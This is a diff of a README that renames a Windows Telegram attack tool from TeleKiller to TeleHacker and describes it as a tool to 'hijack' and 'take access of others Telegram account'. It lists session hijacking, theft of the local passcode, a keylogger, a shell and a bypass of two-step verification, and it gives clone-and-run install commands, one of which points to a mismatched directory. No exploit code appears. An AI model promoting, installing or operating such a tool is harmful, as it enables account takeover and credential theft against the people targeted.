@@ -16,62 +16,34 @@
 
 [![PyPI](https://img.shields.io/badge/Python-2.7-blue.svg)](https://github.com/ultrasecurity/TeleKiller/)
 
-## TeleKiller
-A Tools Session Hijacking And Stealer Local passcode Telegram Windows
+## TeleHacker
+A Tool Used to Hijack and Help to Take Access Of Others Telegram Account.
 
 
 
-## Features :
+## Uses:
 
-- [x] Session Hijacking 
-- [x] Stealer Local Passcode
-- [x] Keylogger
-- [x] Shell 
 - [x] Bypass 2 Step Verification
-- [x] Bypass Av (Coming Soon)
+- [x] Stealer Local Passcode
+- [x] Keylogger to Steal Passcode
+- [x] Shell InterFace
 
 
 
-## Installation [Windows ](https://wikipedia.org/wiki/Microsoft_Windows)[![alt tag](http://icons.iconarchive.com/icons/tatice/cristal-intense/32/Windows-icon.png)](https://fr.wikipedia.org/wiki/Microsoft_Windows)
 
+## Installation [Use Linux Terminal or Termux Or Cmd]
 ```
-git clone https://github.com/ultrasecurity/TeleKiller.git
-cd TeleKiller
+git clone https://github.com/TheDarkW3b/TeleHacker
+cd Hacker
 pip install -r requirements.txt
-python TeleKiller.py
+python TeleHacker.py
 ```
-## Dependency :
+## Requirements:
 
-- [x] python 2.7
-- [x] pyHook
-- [x] pywin32
-
-
-## ScreenShot
-![29](https://user-images.githubusercontent.com/34939571/55636965-48a7ff80-57d9-11e9-8a65-f4023358830d.jpg)
+- python 2.7
+- pyHook
+- pywin32
 
 
-
-## Video Tutorial
-- [+] Youtube : https://youtu.be/Ugz1GSlTZyc
-
-
-## Operating Systems Tested
-
-- Windows 10
-- Windows 8.1
-- Windows 8
-- Windows 7
-
-
-<h2>📧 Contact</h2>
-
-- WebSite Ultra Security Team : https://ultrasec.org
-- Channel Telegram : https://t.me/UltraSecurity
-
-<hr>
-
-
-### Thanks to
-    Milad Ranjbar
-    MrQadir
+## Made By:
+Code Made By [@TheDarkW3b](https://t.me/TheDarkW3b).Special Thanks to Decoder Base For Inspiring and TelegramKiller
